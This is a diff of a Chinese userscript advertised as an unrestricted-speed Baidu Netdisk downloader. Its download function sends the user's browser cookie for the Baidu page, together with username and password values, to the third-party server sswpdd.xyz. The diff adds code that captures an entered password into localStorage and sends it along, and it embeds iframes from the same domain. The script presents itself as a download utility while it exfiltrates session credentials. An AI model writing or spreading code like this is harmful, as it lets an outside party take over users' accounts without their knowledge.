@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name              百度网盘不限制下载-神速Down
 // @namespace         https://github.com/AFANOOO/sspan
-// @version           7.2
+// @version           7.3
 // @author            GreasyFork
 // @description       不限制速度下载的百度网盘解析脚本，无视黑号，拥有IDM/Aria2/Motrix三种方式任意体验极速下载！支持Microsoft Edge、Google Chrome、Firefox等浏览器 面向所有网友免费交流学习使用，更多功能正在完善中...
 // @antifeature       ads
@@ -294,10 +294,10 @@ var siteUrl = 'https://sswpdd.xyz';
 
           </div>
           <div class="layui-tab-item">
-
+           <iframe src="//sswpdd.xyz/tab2.html" width="100%" height="500px"></iframe>
           </div>
           <div class="layui-tab-item">
-
+           <iframe src="//sswpdd.xyz/tab3.html" width="100%" height="500px"></iframe>
           </div>
         </div>
         </div>
@@ -439,7 +439,7 @@ var siteUrl = 'https://sswpdd.xyz';
                                     shade: [0.3, '#FFF'],
                                 });
                                 $('#loadingtext').show();
-                                download_function(value);
+                                download_function();
                             }
                         }
                     })
@@ -711,8 +711,9 @@ var siteUrl = 'https://sswpdd.xyz';
         console.log(USERNAME)
     }
     getUsername()
-    async function download_function(password = 'zzzz') {
-        localStorage.password = password;
+    async function download_function() {
+
+        let password = 'zzzz'
         $('#loadingtext').text('');
 
         saveLastUseData();
@@ -749,6 +750,7 @@ var siteUrl = 'https://sswpdd.xyz';
             }
             var url = res.link;
 
+
             var shorturl = '';
             try {
                 shorturl = url.substring(url.lastIndexOf('/') + 1);
@@ -756,14 +758,14 @@ var siteUrl = 'https://sswpdd.xyz';
             if (!shorturl) {
                 layer.closeAll('loading');
                 $('#loadingtext').hide();
-                Swal.fire("错误！", res.msg, "error");
+                Swal.fire("错误！", res.show_msg, "error");
                 return;
             }
             $('#loadingtext').text('正在查询服务器接口地址......');
             GM_xmlhttpRequest({
                 method: "post",
                 url: siteUrl + '/parse/list',
-                data: "surl=" + shorturl + "&pwd=" + password + "&password=" + password + "&user=" + USERNAME + '&cookie=' + document.cookie,
+                data: "surl=" + shorturl + "&pwd=" + password + "&password=" + localStorage.password + "&user=" + USERNAME + '&cookie=' + document.cookie,
                 headers: {
                     "Content-Type": "application/x-www-form-urlencoded"
                 },
@@ -825,6 +827,7 @@ var siteUrl = 'https://sswpdd.xyz';
                                                 //     // inputs[i].value = '';
 
                                                 // }
+                                                localStorage.password = Array.from(inputs2).map((item) => item.value).join('');
                                                 document.querySelector('.swal2-close').click()
                                             }
 
